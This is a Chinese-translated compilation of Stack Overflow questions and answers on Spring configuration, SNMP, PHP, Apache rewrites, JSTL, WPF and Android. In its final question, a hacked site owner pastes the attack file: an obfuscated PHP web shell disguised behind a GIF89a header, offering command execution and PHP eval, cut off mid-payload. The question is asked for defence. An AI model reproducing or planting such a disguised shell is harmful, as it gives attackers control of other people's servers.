> 
> 时间：2012-07-31T07:52:38.267
> 
> 标签：java, spring, properties, configuration-files

我需要为我们的 spring 项目进行开发和生产设置。我知道您可以为 spring 使用配置文件，但这不是我们可以做的。

我想要做的是在开发环境中放置一个 test-application.properties 文件，在生产环境中放置一个 prod-application.properties 文件。在 tomcat 上下文定义中，我们发送了以下内容：

```
<Context>
    <context-param>
        <param-name>properties_location</param-name>
        <param-value>file:C:\Users\Bill\test-application.properties</param-value>
    </context-param>
</Context> 
```

我们可以更改生产服务器的值。在 spring 配置中，我们有这样的东西：

```
<bean class="org.springframework.context.support.PropertySourcesPlaceholderConfigurer">
    <property name="locations">
        <list>
            <value>${properties_location}</value>
        </list>
    </property>
    <property name="ignoreUnresolvablePlaceholders" value="false" />
</bean> 
```

但我们不断收到如下错误：

> org.springframework.beans.factory.BeanInitializationException：无法加载属性；嵌套异常是 java.io.FileNotFoundException: 无法打开 ServletContext 资源 [/${properties_location}]

关于如何解决的任何想法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-31T09:12:07.127

PropertyPlaceholder 的一项功能是您可以定义多个资源位置。因此，例如，您可以定义**your-production-config.properties**以及**file:C:/Users/${user.name}/test-application.properties**

```
 <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
    <property name="locations">
        <list>
            <value>classpath:your-production-config.properties</value>
            <value>file:C:/Users/${user.name}/test-application.properties</value>
        </list>
    </property>
    <property name="ignoreUnresolvablePlaceholders" value="true"/>
    <property name="ignoreResourceNotFound" value="true"/>
    <property name="systemPropertiesModeName" value="SYSTEM_PROPERTIES_MODE_OVERRIDE"/>        
</bean> 
```

对于生产，您需要将 prod 配置放入类路径中的某个地方（确切的位置并不重要，只是类路径） - 对于本地环境，您可以使用像这个文件这样的约定：C:/Users/${user.name}/test-application.properties

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:34:28.263

我最终通过不使用上下文参数来解决它。相反，我们定义了

```
<bean class="org.springframework.context.support.PropertySourcesPlaceholderConfigurer">
    <property name="locations">
        <list>
            <value>classpath:application.properties</value>
            <value>file:C:\Users\Bill\prod-application.properties</value>
        </list>
    </property>
    <property name="ignoreUnresolvablePlaceholders" value="true" />
    <property name="ignoreResourceNotFound" value="true"/>
</bean> 
```

这种方式尝试加载两个文件。在测试服务器上，我们没有 prod 文件，因此没有加载它。在 prod 服务器上，prod-application.properties 文件存在并覆盖了类路径中的测试。繁琐但有效！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-31T09:42:46.023

```
<context:property-placeholder location="file:${catalina.home}/conf/myFirst.properties" ignore-unresolvable="true" />
<context:property-placeholder   location="classpath:second.properties"  ignore-unresolvable="true"  /> 
```

我像上面那样做。该`catalina.home`变量允许将属性文件涂在tomcat home conf 目录中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T09:30:04.880

就个人而言，尽量避免指定位置。我认为对你来说最好的事情是使用 JNDI 来实现这一点。

在 tomcat/conf/server.xml

```
<Resource name="jdbc/prod" auth="Container"
          type="javax.sql.DataSource" driverClassName="${database.driverClassName}"
          url="${database.url}"
          username="${database.username}" password="${database.password}"
          maxActive="20" maxIdle="10"
          maxWait="-1"/> 
```

并在 tomcat catalina.properties 中（如果使用 Oracle XE 则相应地进行更改）：

```
database.driverClassName=oracle.jdbc.driver.OracleDriver
database.url=jdbc:oracle:thin:@//localhost:1521/XE
database.username=user
database.password=password 
```

在您的应用程序中，在名为 jdbc.properties 的类路径中创建属性文件并放置以下内容（如果使用 Oracle XE，则相应地进行更改）

```
jdbc.driverClassName=oracle.jdbc.driver.OracleDriver
jdbc.url=jdbc:oracle:thin:user/password@//localhost:1521/XE 
```

然后在 Spring applicationContext.xml

```
<context:property-placeholder location="classpath:jdbc.properties" />

<bean id="dataSource" class="org.springframework.jndi.JndiObjectFactoryBean">
    <property name="jndiName" value="java:comp/env/jdbc/prod" />
    <property name="defaultObject" ref="dataSourceFallback" />
</bean> 
```

```
<bean id="dataSourceFallback" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">
    <property name="driverClassName" value="${jdbc.driverClassName}" />
    <property name="url" value="${jdbc.url}" />
    <property name="poolPreparedStatements">
        <value>true</value>
    </property>
    <property name="maxActive">
        <value>4</value>
    </property>
    <property name="maxIdle">
        <value>1</value>
    </property>
</bean> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T07:58:08.370

采用 ：

```
<bean class="org.springframework.context.support.PropertySourcesPlaceholderConfigurer">
    <property name="locations">
        <list>
            <value>C:/Users/Bill/test-application.properties</value>
        </list>
    </property>
    <property name="ignoreUnresolvablePlaceholders" value="false" />
</bean> 
```

从以下代码中删除`web.xml`

```
<Context>
    <context-param>
        <param-name>properties_location</param-name>
        <param-value>file:C:\Users\Bill\test-application.properties</param-value>
    </context-param>
</Context> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-04-21T13:57:32.890

如果您使用 Tcserver 和 server.xml 来配置数据库、队列等资源，您可以使用 com.springsource.tcserver.properties.SystemProperties

在 server.xml 中删除此侦听器，如下所示

```
 <Listener className="com.springsource.tcserver.properties.SystemProperties"
            file.1="${catalina.base}/conf/password.properties"
            file.2="${catalina.base}/conf/server.properties"
            immutable="false"
            trigger="now"/> 
```

现在您可以将属性外部化为两个文件 password.properties 和 server.properties。

# network-protocols - 系统如何用只读访问填充 MIB 条目？

> ID：11735527
> 
> 赞同：0
> 
> 时间：2012-07-31T07:52:40.537
> 
> 标签：network-protocols, snmp

为了管理系统配置，我们以某种形式使用 MIB 管理系统，可能是基于 C 结构的或用于数据建模的 Yang 模块。现在 MIB 中的条目被标记为只读，或者管理器无法访问，即北向接口。操作数据通常保存在此类条目中，例如系统正常运行时间等。

那么，设备本身在这些字段中填充数据是实现特定的，还是设备也使用 GET/SET/TEST 类型的机制来写入这些 MIB 叶？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T12:53:46.910

当您使用 ASN.1 定义 MIB 时，

> 最大访问

条款将是

> 只读

对于该特定数据。因此，它会使 snmp-set 查询在该特定对象标识符 (OID) 上失败，因为代理不允许为它们设置任何值。MAX-ACCESS 的其他可能值是 READ-WRITE、RIGHT-CREATE、WRITE-ONLY、NOT-ACCESSIBLE 和 ACCESSIBLE-FOR_NOTIFY。[查看Essential SNMP](http://oreilly.com/catalog/esnmp/chapter/ch02.html)的在线版本以获取信息。

# java - Java web start 权限问题？

> ID：11735533
> 
> 赞同：1
> 
> 时间：2012-07-31T07:53:05.477
> 
> 标签：java, macos, permissions, java-web-start

![错误](../Images/6271fb51365fa5c9a95e42f53c1d96e3.png)

这是我收到的错误消息，我不知道为什么。我在mac上的java首选项中弄乱了首选项，但在pc上我运行我的应用程序没有问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T07:40:57.783

OS X Mountain Lion 上有一个选项，可以防止任何未经开发人员签名的内容在系统偏好设置的安全选项卡中运行，一旦更改，一切正常。

# java - Spring MVC：管理 BindingException

> ID：11735536
> 
> 赞同：1
> 
> 时间：2012-07-31T07:53:12.860
> 
> 标签：java, spring, spring-mvc

我在将表单输入文本绑定到表单绑定到的 bean 的 Integer 字段时遇到问题。如果我在输入文本中输入了错误的数字（例如：“12b”），我会遇到绑定异常。所以，我以这种方式在我的控制器中设置了一个@InitBinder：

```
 @InitBinder
    public void initBinder(WebDataBinder binder) {
        binder.registerCustomEditor(Integer.class, new CustomIntegerBinder());
    } 
```

其中 CustomIntegerBinder 实现如下：

```
 public class CustomIntegerBinder extends PropertyEditorSupport {

        @Override
        public void setAsText(String text) throws IllegalArgumentException {
            try {
                setValue(Integer.parseInt(text));
            } catch (Exception e) {
                //I WANT TO ADD ERROR TO THE ERROR LIST!
            }
        }

        @Override
        public String getAsText() {
            return getValue().toString();
        }
    } 
```

我的问题是：我怎样才能成功地将消息错误添加到错误列表中，以便转换错误不会导致应用程序崩溃，而是在 jsp 的“错误”标签中打印消息？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:23:37.503

如果无法从文本设置值，则该`setAsText`方法应抛出（如方法签名所示）。`IllegalArgumentException`

如果你`IllegalArgumentException`从你那里抛出`catch`错误，那么 Spring 应该为你添加错误。

# android - 如何更新我的 android 应用程序中的数据？

> ID：11735537
> 
> 赞同：1
> 
> 时间：2012-07-31T07:53:21.443
> 
> 标签：android

我正在开发一个 Android 应用程序。如何使用 Web 服务器更新我的应用程序中的数据？最初，我将在我的应用程序本身中提供数据。但是当我的数据变得过时时，我将如何更新应用程序本身的数据？有没有办法使用互联网来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:14:03.310

这是一个非常普遍的问题，因此有很多方法可以更新应用程序数据。

我假设你有一个 web 服务，它提供了你应用程序的必要内容。例如，如果 web 服务向你发送 json 格式的内容，那么你需要解析并保存数据以供以后使用互联网连接。这只是让您了解其中一种简单方法的示例。

如果您在创建应用程序时询问您在应用程序中放入的数据，比如说资产文件夹中的数据，您不能在那里覆盖数据。如果您想使用来自互联网的更新数据，那么您需要以某种方式保存它。您可以保留从服务器直接发送的文件，也可以解析数据并创建数据库以使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:10:18.527

要从服务器获取有更新可用的通知，请使用推送通知：[Google Cloud Messaging](http://developer.android.com/guide/google/gcm/index.html) (GCM)。

然后你必须使用 http 协议来获取数据。您的问题是一般给出更好的答案。

# php - 调用未定义的函数 filter_var()

> ID：11735538
> 
> 赞同：15
> 
> 时间：2012-07-31T07:53:22.217
> 
> 标签：php

将我的网站转移到另一个主机后，我收到此错误：

```
 Fatal error: Call to undefined function filter_var() in
 /home/ultrastep/ultrastep.ru/docs/sites/all/modules/q_cart/q_cart.module on line 410 
```

服务器上的 PHP 版本是 5.2.10。

有什么想法有什么问题吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-05-31T01:40:28.413

您需要安装 php 模块“过滤器”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-07T00:16:23.637

万一其他人像我一样偶然发现了这个，这是我为 Redhat/CentOS 找到的解决方案：

[http://www.cyberciti.biz/faq/rhel-cento-linux-install-php-pecl-filter/](http://www.cyberciti.biz/faq/rhel-cento-linux-install-php-pecl-filter/)

安装 php-devel 需要安装 php-devel 来编译 php 扩展：

`yum install php-devel`

下载php源代码 php_pcre.h头文件不包含在php源代码5.1.6中，所以你还需要php源代码。访问 php.net 获取最新版本并存储到 /opt 目录。使用 lynx 和 elinks：

`cd /opt`

`elinks http://www.php.net/get/php-5.2.6.tar.bz2/from/a/mirror`

将 php 源代码保存到磁盘。接下来，提取源代码：

`tar -jxvf php-5.2.6.tar.bz2`

下载过滤器扩展访问 pecl 扩展以获取过滤器的最新源代码：

`cd /opt` `wget http://pecl.php.net/get/filter-0.11.0.tgz`

安装过滤器扩展 Unrar 文件：

`tar -jxvf filter-0.11.0.tgz`

`cd filter-0.11.0`

打开logical_filters.c 文件：

`vi logical_filters.c`

查找如下所示的行：

`include "ext/pcre/php_pcre.h"`

改为（需要php_pcre.h的绝对路径）：

`include "/opt/php-5.2.6/ext/pcre/php_pcre.h"`

保存并关闭文件。最后，键入以下命令来编译扩展：

`phpize`

`./configure`

`make install`

配置过滤器扩展 键入以下命令：

`echo 'extension=filter.so' > /etc/php.d/filter.ini`

重启httpd：

`service httpd restart`

# apache - 使用 QUERY STRING 进行 301 重定向

> ID：11735542
> 
> 赞同：0
> 
> 时间：2012-07-31T07:53:34.950
> 
> 标签：apache, .htaccess

我想重定向

```
http://www.mydomain.com/ladies-boots/?shoesize=43&calfwidth=K 
```

至

```
http://www.mydomain.com/ladies-boots/#nogo&landing_sef_url=&producttype=
ladies-boots&shoesize=43&calfwidth=K 
```

目前我正在使用下面的代码，但是它不起作用。

```
RewriteCond %{QUERY_STRING} ^ladies-boots/?shoesize=([0-9]+)\&calfwidth=([A-Z])$ 
RewriteRule ^.*$ http://www.mydomain.com/ladies-boots/#nogo&landing_sef_url=&producttype=ladies-boots&%1 [R=301,L] 
```

请帮我解决这个问题。

**这是我更新的最新代码，**

```
RewriteCond %{QUERY_STRING} ^shoesize=([0-9]+)\&calfwidth=([A-Z])$ 
RewriteRule ^ladies-boots/$ http://www.mydomain.com/ladies-boots/#nogo&landing_sef_url=&producttype=ladies-boots&shoesize=%1&calfwidth=%2? [R=301,L] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:36:09.830

QUERY_STRING 参数就是这样；它不包含 URI 路径信息。

```
RewriteCond %{QUERY_STRING} ^shoesize=([0-9]+)\&calfwidth=([A-Z])$ 
RewriteRule ^ladies-boots/$ $0#nogo&landing_sef_url=&producttype=ladies-boots&%1 [R=301,NE,L] 
```

记得先打开引擎 ( `RewriteEngine On`) 并设置底座 ( `RewriteBase /`)。$0 获取整个匹配字符串，服务器和协议默认相同，因此不需要指定。

# jsp - JSTL/EL 中数字的上限

> ID：11735545
> 
> 赞同：16
> 
> 时间：2012-07-31T07:53:55.043
> 
> 标签：jsp, jstl, el, ceil

在 JSTL 中，

```
<fmt:formatNumber value="${1.6}" type="number" pattern="#"/> 
```

返回`2`和以下

```
<fmt:formatNumber value="${1.4}" type="number" pattern="#"/> 
```

回报`1`，我需要`2`，**一个数字的上限**。

在 JSTL 中是否有直接的方法来实现这一点（或者唯一的方法是使用适当的自定义标签）？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-31T14:21:56.657

使用的默认舍入模式[`DecimalFormat`](http://docs.oracle.com/javase/6/docs/api/java/text/DecimalFormat.html)是。没有办法通过任何标签属性来改变它。当它不是奇数时，只需添加该值即可使其表现得像.[`<fmt:formatNumber>`](http://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/fmt/formatNumber.html)[`RoundingMode.HALF_EVEN`](http://docs.oracle.com/javase/6/docs/api/java/math/RoundingMode.html#HALF_EVEN)`0.5`[`RoundingMode.CEILING`](http://docs.oracle.com/javase/6/docs/api/java/math/RoundingMode.html#CEILING)

```
<fmt:formatNumber value="${bean.number + (bean.number % 1 == 0 ? 0 : 0.5)}" 
    type="number" pattern="#" /> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-31T08:03:26.737

试试这个代码：

```
<fmt:formatNumber value="${N+(1-(N%1))%1}" type="number" pattern="#"/> 
```

其中 N 是变量的名称。

问候

# .net - 为给定控件类型的任何实例创建 ContextMenu

> ID：11735546
> 
> 赞同：0
> 
> 时间：2012-07-31T07:53:58.980
> 
> 标签：.net, wpf, binding, contextmenu

我对 WPF 相当陌生，并且我对同一类型的所有控件的逻辑“分解”有疑问。

更准确地说，对于 Infragistics DataGrid 的任何实例，我都希望有一个带有“导出到 Excel”按钮的上下文菜单，而不必在每次使用所述网格时编写任何代码。此外，如果默认情况下我总是有一个“导出到 Excel”上下文菜单项，我还希望能够根据具体情况透明地添加更多项目。一个好处是能够删除特定实例上的“导出到 Excel”按钮。

我的问题是实现这一目标的最佳方法是什么：

*   子类化 DataGrid 并在“OnInitialized”上以编程方式添加 ContextMenu？问题：我想在其中添加额外菜单项的网格怎么样... XAML 将覆盖已经存在的内容？此外，我不希望我的控件有子类，只需直接使用控件本身并使用 WPF 添加预期的行为。
*   使用“行为”？我可以向这种类型的网格添加一个新的附加属性，但不确定这是否是一个好习惯
*   还要别的吗？

我希望我的问题是有道理的！

注意：这个问题不是关于导出到 Excel，我知道用我的控件执行此操作的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:23:27.040

我最终使用了附加属性解决方案。它非常干净，不会“污染”现有代码。您只需添加一行 XAML（见下文）即可将导出到 excel 功能添加到任何数据网格。

```
<igDP:XamDataGrid
                    x:Name="summary"
                    Behaviours:XamDataGridBehaviours.ExportFileName="plop.xls"
                    ActiveDataItem="{Binding Path=SelectedSummary}">
[...]
</igDP:XamDataGrid> 
```

附加的属性代码本身如下：

```
using System;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using Infragistics.Documents.Excel;
using Infragistics.Windows.DataPresenter;
using Infragistics.Windows.DataPresenter.ExcelExporter;
using Microsoft.Win32;

namespace MYCOMPANY.Plugin.Framework.Behaviours
{
    public class XamDataGridBehaviours
    {
        public static readonly DependencyProperty ExportFileNameProperty = DependencyProperty.RegisterAttached(
    "ExportFileName",
    typeof(string),
    typeof(XamDataGridBehaviours),
    new FrameworkPropertyMetadata(OnExportCommandChanged));

        private const string ExportToExcelHeader = "Export to Excel";

        [AttachedPropertyBrowsableForType(typeof(XamDataGrid))]
        public static string GetExportFileName(XamDataGrid d)
        {
            return (string)d.GetValue(ExportFileNameProperty);
        }

        public static void SetExportFileName(XamDataGrid d, string value)
        {
            d.SetValue(ExportFileNameProperty, value);
        }

        static void OnExportCommandChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
        {
            var grid = d as XamDataGrid;
            var fileName = (string) e.NewValue;

            if (grid != null && !string.IsNullOrEmpty(fileName))
            {
                CreateExcelExportMenu(grid, fileName);
            }
            else if (grid != null && grid.ContextMenu != null)
            {
                SafeDeleteMenuItem(grid.ContextMenu);
            }
        }

        private static void CreateExcelExportMenu(XamDataGrid grid, string fileName)
        {
            var contextMenu = grid.ContextMenu ?? new ContextMenu();

            var exportToExcel = GetOrCreateMenuItem(grid, contextMenu, fileName);

            contextMenu.Items.Add(exportToExcel);

            grid.ContextMenu = contextMenu;
        }

        private static void ExportToExcel(XamDataGrid grid, string fileName)
        {
            var saveFileDialog = new SaveFileDialog();
            saveFileDialog.FileName = fileName;
            saveFileDialog.DefaultExt = ".xls";
            saveFileDialog.Filter = "Excel spreadsheets (.xls)|*.xls";

            if (saveFileDialog.ShowDialog() == true)
            {
                var exporter = new DataPresenterExcelExporter();
                exporter.Export(grid, saveFileDialog.FileName, WorkbookFormat.Excel97To2003);
            }
        }

        private static MenuItem GetOrCreateMenuItem(XamDataGrid grid, ContextMenu menu, string fileName)
        {
            foreach (var item in menu.Items)
            {
                if (item is MenuItem)
                {
                    var menuitem = item as MenuItem;
                    if (menuitem.Header.ToString() == ExportToExcelHeader)
                    {
                        menuitem.Command = new RelayCommand(o => ExportToExcel(grid, fileName));
                        return menuitem;
                    }
                }
            }

            var exportToExcel = new MenuItem();
            exportToExcel.Header = ExportToExcelHeader;
            exportToExcel.Command = new RelayCommand(o => ExportToExcel(grid, fileName));

            var icon = new Image();
            var bmImage = new BitmapImage();
            bmImage.BeginInit();
            bmImage.UriSource = new Uri(@"..\..\Images\excel.png", UriKind.RelativeOrAbsolute);
            bmImage.EndInit();
            icon.Source = bmImage;
            icon.MaxWidth = 16;
            exportToExcel.Icon = icon;

            return exportToExcel;
        }

        private static void SafeDeleteMenuItem(ContextMenu menu)
        {
            MenuItem toDelete = null;

            foreach (var item in menu.Items)
            {
                if (item is MenuItem)
                {
                    var menuitem = item as MenuItem;
                    if (menuitem.Header.ToString() == ExportToExcelHeader)
                    {
                        toDelete = menuitem;
                        break;
                    }
                }
            }

            if (toDelete != null)
                menu.Items.Remove(toDelete);
        }
    }
} 
```

如您所见，每当我们为网格设置一个非空的导出文件名时，代码都会添加一个导出到 excel 项。如果文件名最终为 null，则代码将尝试删除导出项（如果存在）。这样，它不应该阻止 xaml 设置其他项目，并且应该保持透明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:39:42.227

在您的数据网格控件中创建一个`List<MenuItem> DependencyProperty`（如果您想从. 并在事件中将这些附加到 Common MenuItems。我希望这会有所帮助。`ViewModel``menuItems``event DataGridLoaded``menuItems`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T11:04:51.087

如果您在 XAML 中执行此操作，则可以执行以下操作：

```
<DataGrid>
  <DataGrid.ContextMenu>
     <!--Binding to your view model and the command is whatever your command name should be ->
     <MenuItem Header="Export to CSV" Command="{Binding Export}"/>
  </DataGrid.ContextMenu>
</DataGrid> 
```

这允许您将新对象添加到上下文菜单。

# android - Eclipse模拟器dpi不能设置超过320dpi？

> ID：11735547
> 
> 赞同：0
> 
> 时间：2012-07-31T07:54:02.707
> 
> 标签：android, resolution

您必须在模拟器上定义 dpi。240 是 hdpi，160 是 mdpi，低于通常是 ldpi。

摘自上面的 Android 开发者指南链接：

320dp：典型的手机屏幕（240x320 ldpi、320x480 mdpi、480x800 hdpi 等）。
480dp：像 Streak (480x800 mdpi) 这样的补间平板电脑。
600dp：7 英寸平板电脑 (600x1024 mdpi)。
720dp：10 英寸平板电脑（720x1280 mdpi、800x1280 mdpi 等）。

这意味着 320dp 是 xhdpi 但在 eclipse 中，我们不能设置 480dp 或任何其他值。那么我将如何将（抽象液晶密度）设置为 480dp 或更高？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:09:50.447

//实际上你会感到困惑

在这里您提到 320,480,600 和 720 是纵向模式下设备的宽度。

//此图像显示如何将 320dp 屏幕创建为 240 作为 hdpi，或者您可以将其用于 320 xhdpi 模拟器 ![在此处输入图像描述](../Images/347ce0b3a3b412e80c5894760660f3ed.png)

**注意：**这里 213dpi 是 nexus 7 设备的新 tvdpi。

# php - 如何保护服务器 linux 免受编码外壳的影响

> ID：11735549
> 
> 赞同：1
> 
> 时间：2012-07-31T07:54:10.127
> 
> 标签：php, linux, decode

我的网站被这个文件黑了（我会为文件外壳放上酸的代码）

```
GIF89a;
<?php $_F=__FILE__;$_X='Pz48P3BocA0KNXJyMnJfcjVwMnJ0NG5nKDApOyAvL0lmIHRoNXI1IDRzIDFuIDVycjJyLCB3NSdsbCBzaDJ3IDR0LCBrPw0KJHAxc3N3MnJkID0gIiI7IC8vIFkyMyBjMW4gcDN0IDEgbWRpIHN0cjRuZyBoNXI1IHQyMiwgZjJyIHBsMTRudDV4dCBwMXNzdzJyZHM6IG0xeCBvNiBjaDFycy4NCiRtNSA9IGIxczVuMW01KF9fRklMRV9fKTsNCiRjMjJrNDVuMW01ID0gInc0NTU1NTUiOw0KDQo0Zig0c3M1dCgkX1BPU1RbJ3Axc3MnXSkpIC8vSWYgdGg1IDNzNXIgbTFkNSAxIGwyZzRuIDF0dDVtcHQsICJwMXNzIiB3NGxsIGI1IHM1dCA1aD8NCnsNCiA0ZihzdHJsNW4oJHAxc3N3MnJkKSA9PSBvYSkgLy9JZiB0aDUgbDVuZ3RoIDJmIHRoNSBwMXNzdzJyZCA0cyBvYSBjaDFyMWN0NXJzLCB0aHI1MXQgNHQgMXMgMW4gbWRpLg0KIHsNCiAgJF9QT1NUWydwMXNzJ10gPSBtZGkoJF9QT1NUWydwMXNzJ10pOw0KIH0NCiA0ZigkX1BPU1RbJ3Axc3MnXSA9PSAkcDFzc3cycmQpDQogew0KICAgczV0YzIyazQ1KCRjMjJrNDVuMW01LCAkX1BPU1RbJ3Axc3MnXSwgdDRtNSgpK29lMDApOyAvL0l0J3MgMWxyNGdodCwgbDV0IGg1bSA0bg0KIH0NCiByNWwyMWQoKTsNCn0NCiANCjRmKCE1bXB0eSgkcDFzc3cycmQpICYmICE0c3M1dCgkX0NPT0tJRVskYzIyazQ1bjFtNV0pIDJyICgkX0NPT0tJRVskYzIyazQ1bjFtNV0gIT0gJHAxc3N3MnJkKSkNCnsNCiBsMmc0bigpOw0KIGQ0NSgpOw0KfQ0KLy8NCi8vRDIgbjJ0IGNyMnNzIHRoNHMgbDRuNSEgQWxsIGMyZDUgcGwxYzVkIDFmdDVyIHRoNHMgYmwyY2sgYzFuJ3QgYjUgNXg1YzN0NWQgdzR0aDIzdCBiNTRuZyBsMmdnNWQgNG4hDQovLw0KNGYoNHNzNXQoJF9HRVRbJ3AnXSkgJiYgJF9HRVRbJ3AnXSA9PSAibDJnMjN0IikNCnsNCnM1dGMyMms0NSAoJGMyMms0NW4xbTUsICIiLCB0NG01KCkgLSBvZTAwKTsNCnI1bDIxZCgpOw0KfQ0KNGYoNHNzNXQoJF9HRVRbJ2Q0ciddKSkNCnsNCiBjaGQ0cigkX0dFVFsnZDRyJ10pOw0KfQ0KDQokcDFnNXMgPSAxcnIxeSgNCiAnY21kJyA9PiAnRXg1YzN0NSBDMm1tMW5kJywNCiAnNXYxbCcgPT4gJ0V2MWwzMXQ1IFBIUCcsDQogJ215c3FsJyA9PiAnTXlTUUwgUTM1cnknLA0KICdjaG0yZCcgPT4gJ0NobTJkIEY0bDUnLA0KICdwaHA0bmYyJyA9PiAnUEhQNG5mMicsDQogJ21kaScgPT4gJ21kaSBjcjFjazVyJywNCiAnaDUxZDVycycgPT4gJ1NoMncgaDUxZDVycycsDQogJ2wyZzIzdCcgPT4gJ0wyZyAyM3QnDQopOw0KLy9UaDUgaDUxZDVyLCBsNGs1IDR0Pw0KJGg1MWQ1ciA9ICc8aHRtbD4NCjx0NHRsNT4nLmc1dDVudigiSFRUUF9IT1NUIikuJyB+IFNoNWxsIEk8L3Q0dGw1Pg0KPGg1MWQ+DQo8c3R5bDU+DQp0ZCB7DQogZjJudC1zNHo1OiA2YXB4OyANCiBmMm50LWYxbTRseTogdjVyZDFuMTsNCiBjMmwycjogI29vRkYwMDsNCiBiMWNrZ3IyM25kOiAjMDAwMDAwOw0KfQ0KI2Qgew0KIGIxY2tncjIzbmQ6ICMwMG8wMDA7DQp9DQojZiB7DQogYjFja2dyMjNuZDogIzAwb28wMDsNCn0NCiNzIHsNCiBiMWNrZ3IyM25kOiAjMDBlbzAwOw0KfQ0KI2Q6aDJ2NXINCnsNCiBiMWNrZ3IyM25kOiAjMDBvbzAwOw0KfQ0KI2Y6aDJ2NXINCnsNCiBiMWNrZ3IyM25kOiAjMDBvMDAwOw0KfQ0KcHI1IHsNCiBmMm50LXM0ejU6IDYwcHg7IA0KIGYybnQtZjFtNGx5OiB2NXJkMW4xOw0KIGMybDJyOiAjb29GRjAwOw0KfQ0KMTpoMnY1ciB7DQp0NXh0LWQ1YzJyMXQ0Mm46IG4ybjU7DQp9DQoNCjRucDN0LHQ1eHQxcjUxLHM1bDVjdCB7DQogYjJyZDVyLXQycC13NGR0aDogNnB4OyANCiBmMm50LXc1NGdodDogYjJsZDsgDQogYjJyZDVyLWw1ZnQtdzRkdGg6IDZweDsgDQogZjJudC1zNHo1OiA2MHB4OyANCiBiMnJkNXItbDVmdC1jMmwycjogI29vRkYwMDsgDQogYjFja2dyMjNuZDogIzAwMDAwMDsgDQogYjJyZDVyLWIydHQybS13NGR0aDogNnB4OyANCiBiMnJkNXItYjJ0dDJtLWMybDJyOiAjb29GRjAwOyANCiBjMmwycjogI29vRkYwMDsgDQogYjJyZDVyLXQycC1jMmwycjogI29vRkYwMDsgDQogZjJudC1mMW00bHk6IHY1cmQxbjE7IA0KIGIycmQ1ci1yNGdodC13NGR0aDogNnB4OyANCiBiMnJkNXItcjRnaHQtYzJsMnI6ICNvb0ZGMDA7DQp9DQpociB7DQpjMmwycjogI29vRkYwMDsNCmIxY2tncjIzbmQtYzJsMnI6ICNvb0ZGMDA7DQpoNTRnaHQ6IGlweDsNCn0NCjwvc3R5bDU+DQo8L2g1MWQ+DQo8YjJkeSBiZ2MybDJyPWJsMWNrIDFsNG5rPSIjb29DQzAwIiB2bDRuaz0iI29vOTkwMCIgbDRuaz0iI29vOTkwMCI+DQo8dDFibDUgdzRkdGg9NjAwJT48dGQgNGQ9Img1MWQ1ciIgdzRkdGg9NjAwJT4NCjxwIDFsNGduPXI0Z2h0PjxiPls8MSBocjVmPSJodHRwOi8vd3d3LnIyMnRzaDVsbC10NTFtLjRuZjIiPlIyMnRTaDVsbDwvMT5dICBbPDEgaHI1Zj0iJy4kbTUuJyI+SDJtNTwvMT5dICc7DQpmMnI1MWNoKCRwMWc1cyAxcyAkcDFnNSA9PiAkcDFnNV9uMW01KQ0Kew0KICRoNTFkNXIgLj0gJyBbPDEgaHI1Zj0iP3A9Jy4kcDFnNS4nJmQ0cj0nLnI1MWxwMXRoKCcuJykuJyI+Jy4kcDFnNV9uMW01Lic8LzE+XSAnOw0KfQ0KJGg1MWQ1ciAuPSAnPGJyPjxocj4nLnNoMndfZDRycygnLicpLic8L3RkPjx0cj48dGQ+JzsNCnByNG50ICRoNTFkNXI7DQokZjIydDVyID0gJzx0cj48dGQ+PGhyPjxjNW50NXI+JmMycHk7IDwxIGhyNWY9Imh0dHA6Ly93d3cuNHIybncxcjV6LjRuZjIiPklyMm48LzE+ICYgPDEgaHI1Zj0iaHR0cDovL3d3dy5yMjJ0c2g1bGwtdDUxbS40bmYyIj5SMjJ0U2g1bGwgUzVjM3I0dHkgR3IyM3A8LzE+PC9jNW50NXI+PC90ZD48L3QxYmw1PjwvYjJkeT48L2g1MWQ+PC9odG1sPic7DQoNCi8vDQovL1AxZzUgaDFuZGw0bmcNCi8vDQo0Zig0c3M1dCgkX1JFUVVFU1RbJ3AnXSkpDQp7DQogIHN3NHRjaCAoJF9SRVFVRVNUWydwJ10pIHsNCiAgIA0KICAgYzFzNSAnY21kJzogLy9SM24gYzJtbTFuZA0KICAgIA0KICAgIHByNG50ICI8ZjJybSAxY3Q0Mm49XCIiLiRtNS4iP3A9Y21kJmQ0cj0iLnI1MWxwMXRoKCcuJykuIlwiIG01dGgyZD1QT1NUPjxiPkMybW0xbmQ6PC9iPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1jMm1tMW5kPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT1cIkV4NWMzdDVcIj48L2Yycm0+IjsNCiAgICAgNGYoNHNzNXQoJF9SRVFVRVNUWydjMm1tMW5kJ10pKQ0KICAgICB7DQogICAgICBwcjRudCAiPHByNT4iOw0KICAgICAgNXg1YzN0NV9jMm1tMW5kKGc1dF81eDVjM3Q0Mm5fbTV0aDJkKCksJF9SRVFVRVN